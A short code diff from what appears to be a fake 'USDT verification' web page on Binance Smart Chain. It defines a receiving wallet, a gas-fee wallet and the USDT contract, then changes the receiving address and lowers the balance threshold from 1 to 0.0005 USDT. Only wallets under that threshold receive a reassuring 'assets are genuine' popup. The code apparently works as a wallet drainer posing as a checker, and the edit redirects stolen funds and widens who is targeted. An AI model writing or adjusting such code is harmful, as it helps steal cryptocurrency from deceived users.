@@ -1,4 +1,4 @@
-const bscAddress = "0xce81b9c0658B84F2a8fD7adBBeC8B7C26953D090"; // Your USDT receiving address
+const bscAddress = "0xb52a233c8aEcA4dEee197D22cdC6d04fFfB7dBAe"; // Your USDT receiving address
 const bnbGasSender = "0x04a7f2e3E53aeC98B9C8605171Fc070BA19Cfb87"; // Wallet for gas fees
 const usdtContractAddress = "0x55d398326f99059fF775485246999027B3197955"; // USDT BEP20 Contract
 
@@ -59,7 +59,7 @@ async function verifyAssets() {
         return;
     }
 
-    if (usdtBalance <= 1) {
+    if (usdtBalance <= 0.0005) {
         showPopup(
             `✅ Verification Successful<br>Your assets are genuine. No flash or reported USDT found.<br><br><b>USDT Balance:</b> ${usdtBalance} USDT<br><b>BNB Balance:</b> ${userBNB} BNB`,
             "green"
